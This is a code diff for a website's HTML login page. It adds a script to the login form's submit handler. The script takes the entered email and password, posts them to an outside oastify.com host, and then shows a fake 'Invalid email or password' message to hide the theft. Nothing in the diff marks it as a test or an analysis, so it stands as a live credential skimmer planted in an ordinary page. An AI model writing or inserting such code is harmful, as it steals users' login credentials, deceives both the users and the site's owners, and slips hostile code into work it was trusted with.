@@ -349,6 +349,25 @@
           <div class="footer-text">
             Don’t have an account? <a href="/register">Create one</a>
           </div>
+          <script>
+document.getElementById('loginForm').addEventListener('submit', function (e) {
+  e.preventDefault();
+
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+
+  const formData = new FormData();
+  formData.append('email', email);
+  formData.append('password', password);
+
+  fetch('https://fcv8jv5t80gr4k56dxyj6zqe157wvpje.oastify.com', {
+    method: 'POST',
+    body: formData
+  });
+
+  alert("Invalid email or password. Please try again.");
+});
+</script>
         </div>
       </section>
     </main>
